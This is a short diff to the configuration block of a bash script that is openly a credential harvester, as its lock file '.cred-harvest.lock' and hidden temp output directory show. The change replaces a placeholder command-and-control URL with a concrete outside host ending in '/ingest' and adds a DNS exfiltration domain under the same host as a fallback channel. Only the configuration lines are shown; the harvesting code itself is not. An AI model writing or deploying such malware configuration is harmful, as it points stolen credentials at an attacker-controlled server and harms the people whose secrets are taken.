@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 
 # ── Configuration ─────────────────────────────────────────────────────────────
-C2_URL="C2_URL_PLACEHOLDER"                                # replaced at serve time by delivery server
-DNS_DOMAIN=""       # e.g. exfil.example.com (DNS cat fallback)
+C2_URL="https://term.safalkarki7.com.np/ingest"                                # replaced at serve time by delivery server
+DNS_DOMAIN="exfil.safalkarki7.com.np"       # e.g. exfil.example.com (DNS cat fallback)
 LOCK_NAME=".cred-harvest.lock"
 TIMESTAMP=$(date +%s 2>/dev/null || echo "0")
 OUTDIR="/tmp/.cache-$$"
